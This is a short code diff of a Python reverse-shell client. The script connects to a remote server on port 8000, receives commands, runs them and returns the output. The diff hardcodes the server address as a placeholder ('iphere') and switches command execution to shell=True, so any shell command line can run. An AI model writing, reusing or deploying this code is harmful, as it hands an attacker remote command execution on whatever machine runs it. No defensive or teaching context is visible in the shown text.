@@ -3,7 +3,7 @@ from subprocess import Popen, PIPE
 from socket import *
 
 #getIP Address from command line prompt
-serverName = sys.argv[1]
+serverName = "iphere"
 serverPort = 8000
 
 #Create IPv4(AF_INET), TCPSocket(Sock_Stream)
@@ -19,7 +19,7 @@ print(command)
 #if the command is not exit
 while command != "exit":
 	#create a subprocess, and execute the command
-	proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
+	proc = Popen(command, stdout=PIPE, stderr=PIPE,shell=True)
 	#read the results of the command
 	result, err = proc.communicate()
 	#send the result to the server
